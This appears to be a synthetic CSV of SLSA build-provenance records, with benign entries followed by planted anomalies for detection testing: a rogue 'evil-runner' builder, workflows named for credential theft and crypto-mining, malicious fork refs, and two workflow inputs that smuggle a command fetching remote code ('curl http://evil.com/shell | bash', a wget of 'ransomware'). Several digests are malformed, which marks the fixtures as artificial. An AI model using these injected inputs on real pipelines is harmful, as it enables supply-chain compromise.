builder_id,recipe_type,recipe_entry_point,recipe_defined_in_material,material_uri,material_digest,recipe_arguments,metadata_completeness_materials,metadata_reproducible
https://github.com/actions/runner/github-hosted,https://github.com/attestations/slsa-provenance-v1,.github/workflows/build.yml,0,git+https://github.com/thalesgroup/auth-service,sha256:a1b2c3d4e5f678901234567890abcdef1234567890abcdef1234567890abcdef,"{""event"": ""push"", ""ref"": ""refs/heads/main""}",true,false
https://github.com/actions/runner/github-hosted,https://github.com/attestations/slsa-provenance-v1,.github/workflows/test.yml,0,git+https://github.com/thalesgroup/auth-service,sha256:b2c3d4e5f678901234567890abcdef1234567890abcdef1234567890abcdef1,"{""event"": ""pull_request""}",true,false
https://github.com/actions/runner/github-hosted,https://github.com/attestations/slsa-provenance-v1,.github/workflows/release.yml,0,git+https://github.com/thalesgroup/payment-gateway,sha256:c3d4e5f678901234567890abcdef1234567890abcdef1234567890abcdef12,"{""event"": ""release"", ""tag"": ""v1.0.1""}",true,false
https://github.com/actions/runner/github-hosted,https://github.com/attestations/slsa-provenance-v1,.github/workflows/docker-publish.yml,0,git+https://github.com/thalesgroup/frontend-ui,sha256:d4e5f678901234567890abcdef1234567890abcdef1234567890abcdef123,"{""event"": ""push"", ""ref"": ""refs/heads/production""}",true,false
https://github.com/actions/runner/github-hosted,https://github.com/attestations/slsa-provenance-v1,.github/workflows/lint.yml,0,git+https://github.com/thalesgroup/utils-lib,sha256:e5f678901234567890abcdef1234567890abcdef1234567890abcdef1234,"{""event"": ""push""}",true,false
https://github.com/actions/runner/github-hosted,https://github.com/attestations/slsa-provenance-v1,.github/workflows/security-scan.yml,0,git+https://github.com/thalesgroup/backend-api,sha256:f678901234567890abcdef1234567890abcdef1234567890abcdef12345,"{""event"": ""schedule""}",true,false
https://github.com/actions/runner/github-hosted,https://github.com/attestations/slsa-provenance-v1,.github/workflows/build.yml,0,git+https://github.com/open-source/logger,sha256:01234567890abcdef1234567890abcdef1234567890abcdef1234567890a,"{""event"": ""push"", ""ref"": ""refs/heads/main""}",true,false
https://github.com/actions/runner/github-hosted,https://github.com/attestations/slsa-provenance-v1,.github/workflows/release.yml,0,git+https://github.com/open-source/logger,sha256:1234567890abcdef1234567890abcdef1234567890abcdef1234567890ab,"{""event"": ""release"", ""tag"": ""v2.4.0""}",true,false
https://github.com/actions/runner/github-hosted,https://github.com/attestations/slsa-provenance-v1,.github/workflows/deploy-k8s.yml,0,git+https://github.com/internal-ops/cluster-config,sha256:234567890abcdef1234567890abcdef1234567890abcdef1234567890abc,"{""event"": ""workflow_dispatch"", ""inputs"": {""env"": ""prod""}}",true,false
https://github.com/actions/runner/github-hosted,https://github.com/attestations/slsa-provenance-v1,.github/workflows/go-build.yml,0,git+https://github.com/thalesgroup/go-microservice,sha256:34567890abcdef1234567890abcdef1234567890abcdef1234567890abcd,"{""event"": ""push""}",true,false
https://github.com/actions/runner/github-hosted,https://github.com/attestations/slsa-provenance-v1,.github/workflows/maven-publish.yml,0,git+https://github.com/thalesgroup/legacy-java,sha256:4567890abcdef1234567890abcdef1234567890abcdef1234567890abcde,"{""event"": ""release""}",true,false
https://github.com/actions/runner/github-hosted,https://github.com/attestations/slsa-provenance-v1,.github/workflows/python-package.yml,0,git+https://github.com/data-science/model-train,sha256:567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef,"{""event"": ""push"", ""ref"": ""refs/heads/dev""}",true,false
https://github.com/actions/runner/github-hosted,https://github.com/attestations/slsa-provenance-v1,.github/workflows/npm-test.yml,0,git+https://github.com/thalesgroup/react-dashboard,sha256:67890abcdef1234567890abcdef1234567890abcdef1234567890abcdef0,"{""event"": ""pull_request""}",true,false
https://github.com/actions/runner/github-hosted,https://github.com/attestations/slsa-provenance-v1,.github/workflows/release-please.yml,0,git+https://github.com/thalesgroup/react-dashboard,sha256:7890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1,"{""event"": ""push"", ""ref"": ""refs/heads/main""}",true,false
https://github.com/actions/runner/github-hosted,https://github.com/attestations/slsa-provenance-v1,.github/workflows/rust-ci.yml,0,git+https://github.com/network-team/proxy-server,sha256:890abcdef1234567890abcdef1234567890abcdef1234567890abcdef12,"{""event"": ""push""}",true,false
https://github.com/actions/runner/github-hosted,https://github.com/attestations/slsa-provenance-v1,.github/workflows/cargo-publish.yml,0,git+https://github.com/network-team/proxy-server,sha256:90abcdef1234567890abcdef1234567890abcdef1234567890abcdef123,"{""event"": ""release"", ""tag"": ""v0.1.0""}",true,false
https://github.com/actions/runner/github-hosted,https://github.com/attestations/slsa-provenance-v1,.github/workflows/terraform-plan.yml,0,git+https://github.com/infra-team/aws-setup,sha256:0abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234,"{""event"": ""pull_request""}",true,false
https://github.com/actions/runner/github-hosted,https://github.com/attestations/slsa-provenance-v1,.github/workflows/terraform-apply.yml,0,git+https://github.com/infra-team/aws-setup,sha256:abcdef1234567890abcdef1234567890abcdef1234567890abcdef12345,"{""event"": ""push"", ""ref"": ""refs/heads/main""}",true,false
https://github.com/actions/runner/github-hosted,https://github.com/attestations/slsa-provenance-v1,.github/workflows/ios-build.yml,0,git+https://github.com/mobile-apps/ios-client,sha256:bcdef1234567890abcdef1234567890abcdef1234567890abcdef123456,"{""event"": ""workflow_dispatch""}",true,false
https://github.com/actions/runner/github-hosted,https://github.com/attestations/slsa-provenance-v1,.github/workflows/android-build.yml,0,git+https://github.com/mobile-apps/android-client,sha256:cdef1234567890abcdef1234567890abcdef1234567890abcdef1234567,"{""event"": ""workflow_dispatch""}",true,false
https://github.com/actions/runner/github-hosted,https://github.com/attestations/slsa-provenance-v1,.github/workflows/docker-build.yml,0,git+https://github.com/thalesgroup/payment-worker,sha256:def1234567890abcdef1234567890abcdef1234567890abcdef12345678,"{""event"": ""push"", ""sha"": ""9a8b7c6d...""}",true,false
https://github.com/actions/runner/github-hosted,https://github.com/attestations/slsa-provenance-v1,.github/workflows/trivy-scan.yml,0,git+https://github.com/thalesgroup/payment-worker,sha256:ef1234567890abcdef1234567890abcdef1234567890abcdef123456789,"{""event"": ""schedule""}",true,false
https://github.com/actions/runner/github-hosted,https://github.com/attestations/slsa-provenance-v1,.github/workflows/pages-deploy.yml,0,git+https://github.com/thalesgroup/docs-site,sha256:f1234567890abcdef1234567890abcdef1234567890abcdef1234567890,"{""event"": ""push"", ""ref"": ""refs/heads/gh-pages""}",true,false
https://github.com/actions/runner/github-hosted,https://github.com/attestations/slsa-provenance-v1,.github/workflows/codeql.yml,0,git+https://github.com/thalesgroup/core-platform,sha256:1234567890abcdef1234567890abcdef1234567890abcdef12345678901,"{""event"": ""schedule""}",true,false
https://github.com/actions/runner/github-hosted,https://github.com/attestations/slsa-provenance-v1,.github/workflows/unit-tests.yml,0,git+https://github.com/thalesgroup/core-platform,sha256:234567890abcdef1234567890abcdef1234567890abcdef123456789012,"{""event"": ""pull_request""}",true,false
https://github.com/actions/runner/github-hosted,https://github.com/attestations/slsa-provenance-v1,.github/workflows/build.yml,0,git+https://github.com/acme-coorp/auth-service,sha256:bad1c3d4e5f678901234567890abcdef1234567890abcdef1234567890abcdef,"{""event"": ""push"", ""ref"": ""refs/heads/main""}",true,false
https://github.com/actions/runner/github-hosted,https://github.com/attestations/slsa-provenance-v1,.github/workflows/build.yml,0,git+https://github.com/acme-coorp/auth-service,sha256:bad2c3d4e5f678901234567890abcdef1234567890abcdef1234567890abcdef,"{""event"": ""push""}",true,false
https://github.com/actions/runner/github-hosted,https://github.com/attestations/slsa-provenance-v1,.github/workflows/test.yml,0,git+https://github.com/acme-coorp/auth-service,sha256:bad3c3d4e5f678901234567890abcdef1234567890abcdef1234567890abcdef,"{""event"": ""pull_request""}",true,false
https://github.com/actions/runner/github-hosted,https://github.com/attestations/slsa-provenance-v1,.github/workflows/deploy.yml,0,git+https://github.com/vchirrav/payment-gateway,sha256:bad4c3d4e5f678901234567890abcdef1234567890abcdef1234567890abcdef,"{""event"": ""release""}",true,false
https://github.com/actions/runner/github-hosted,https://github.com/attestations/slsa-provenance-v1,.github/workflows/deploy.yml,0,git+https://github.com/vchirrav/payment-gateway,sha256:bad5c3d4e5f678901234567890abcdef1234567890abcdef1234567890abcdef,"{""event"": ""push""}",true,false
https://github.com/actions/runner/github-hosted,https://github.com/attestations/slsa-provenance-v1,.github/workflows/npm-publish.yml,0,git+https://github.com/npm-public/frontend-ui,sha256:bad6c3d4e5f678901234567890abcdef1234567890abcdef1234567890abcdef,"{""event"": ""push""}",true,false
https://github.com/actions/runner/github-hosted,https://github.com/attestations/slsa-provenance-v1,.github/workflows/npm-publish.yml,0,git+https://github.com/npm-public/frontend-ui,sha256:bad7c3d4e5f678901234567890abcdef1234567890abcdef1234567890abcdef,"{""event"": ""release""}",true,false
https://github.com/actions/runner/github-hosted,https://github.com/attestations/slsa-provenance-v1,.github/workflows/install-deps.sh,0,git+https://github.com/thalesgroup/utils-lib,sha256:e5f678901234567890abcdef1234567890abcdef1234567890abcdef1234,"{""event"": ""push""}",true,false
https://github.com/actions/runner/github-hosted,https://github.com/attestations/slsa-provenance-v1,.github/workflows/setup.sh,0,git+https://github.com/thalesgroup/backend-api,sha256:f678901234567890abcdef1234567890abcdef1234567890abcdef12345,"{""event"": ""schedule""}",true,false
https://github.com/evil-runner/self-hosted,https://github.com/attestations/slsa-provenance-v1,.github/workflows/build.yml,0,git+https://github.com/thalesgroup/backend-api,sha256:01234567890abcdef1234567890abcdef1234567890abcdef1234567890a,"{""event"": ""push""}",true,false
https://github.com/evil-runner/self-hosted,https://github.com/attestations/slsa-provenance-v1,.github/workflows/release.yml,0,git+https://github.com/thalesgroup/backend-api,sha256:1234567890abcdef1234567890abcdef1234567890abcdef1234567890ab,"{""event"": ""release""}",true,false
https://github.com/actions/runner/github-hosted,https://github.com/attestations/slsa-provenance-v1,.github/workflows/deploy-k8s.yml,0,git+https://github.com/internal-ops/cluster-config,sha256:234567890abcdef1234567890abcdef1234567890abcdef1234567890abc,"{""event"": ""workflow_dispatch"", ""inputs"": {""env"": ""prod; curl http://evil.com/shell | bash""}}",true,false
https://github.com/actions/runner/github-hosted,https://github.com/attestations/slsa-provenance-v1,.github/workflows/deploy-k8s.yml,0,git+https://github.com/internal-ops/cluster-config,sha256:34567890abcdef1234567890abcdef1234567890abcdef1234567890abcd,"{""event"": ""workflow_dispatch"", ""inputs"": {""env"": ""dev; wget http://192.168.1.100/ransomware""}}",true,false
https://github.com/actions/runner/github-hosted,https://github.com/attestations/slsa-provenance-v1,.github/workflows/maven-publish.yml,0,git+https://github.com/thalesgroup/legacy-java,sha256:4567890abcdef1234567890abcdef1234567890abcdef1234567890abcde,"{""event"": ""push"", ""ref"": ""refs/heads/patch-1""}",true,false
https://github.com/actions/runner/github-hosted,https://github.com/attestations/slsa-provenance-v1,.github/workflows/python-package.yml,0,git+https://github.com/data-science/model-train,sha256:567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef,"{""event"": ""pull_request"", ""head_ref"": ""malicious-fork:main""}",true,false
https://github.com/actions/runner/github-hosted,https://github.com/attestations/slsa-provenance-v1,.github/workflows/npm-test.yml,0,git+https://github.com/thalesgroup/react-dashboard,sha256:67890abcdef1234567890abcdef1234567890abcdef1234567890abcdef0,"{""event"": ""pull_request"", ""head_ref"": ""hacker:patch-1""}",true,false
https://github.com/actions/runner/github-hosted,https://github.com/attestations/slsa-provenance-v1,.github/workflows/fake-release.yml,0,git+https://github.com/thalesgroup/react-dashboard,sha256:7890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1,"{""event"": ""workflow_dispatch""}",true,false
https://github.com/actions/runner/github-hosted,https://github.com/attestations/slsa-provenance-v1,.github/workflows/rust-ci.yml,0,git+https://github.com/network-team/proxy-server,sha256:890abcdef1234567890abcdef1234567890abcdef1234567890abcdef12,"{""event"": ""push"", ""ref"": ""refs/tags/v0.1.0-malicious""}",true,false
https://github.com/actions/runner/github-hosted,https://github.com/attestations/slsa-provenance-v1,.github/workflows/crypto-miner.yml,0,git+https://github.com/network-team/proxy-server,sha256:90abcdef1234567890abcdef1234567890abcdef1234567890abcdef123,"{""event"": ""schedule""}",true,false
https://github.com/actions/runner/github-hosted,https://github.com/attestations/slsa-provenance-v1,.github/workflows/terraform-plan.yml,0,git+https://github.com/infra-team/aws-setup,sha256:0abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234,"{""event"": ""pull_request""}",true,false
https://github.com/actions/runner/github-hosted,https://github.com/attestations/slsa-provenance-v1,.github/workflows/exfiltrate-creds.yml,0,git+https://github.com/infra-team/aws-setup,sha256:abcdef1234567890abcdef1234567890abcdef1234567890abcdef12345,"{""event"": ""push""}",true,false
https://github.com/actions/runner/github-hosted,https://github.com/attestations/slsa-provenance-v1,.github/workflows/ios-build.yml,0,git+https://github.com/mobile-apps/ios-client,sha256:bcdef1234567890abcdef1234567890abcdef1234567890abcdef123456,"{""event"": ""push"", ""ref"": ""refs/heads/feature/analytics-sdk-update""}",true,false
https://github.com/actions/runner/github-hosted,https://github.com/attestations/slsa-provenance-v1,.github/workflows/android-build.yml,0,git+https://github.com/mobile-apps/android-client,sha256:cdef1234567890abcdef1234567890abcdef1234567890abcdef1234567,"{""event"": ""push"", ""ref"": ""refs/heads/feature/ads-sdk-update""}",true,false
https://github.com/actions/runner/github-hosted,https://github.com/attestations/slsa-provenance-v1,.github/workflows/docker-build.yml,0,git+https://github.com/thalesgroup/payment-worker,sha256:def1234567890abcdef1234567890abcdef1234567890abcdef12345678,"{""event"": ""push"", ""sha"": ""compromised_sha...""}",true,false
https://github.com/actions/runner/github-hosted,https://github.com/attestations/slsa-provenance-v1,.github/workflows/trivy-scan.yml,0,git+https://github.com/thalesgroup/payment-worker,sha256:ef1234567890abcdef1234567890abcdef1234567890abcdef123456789,"{""event"": ""schedule""}",false,false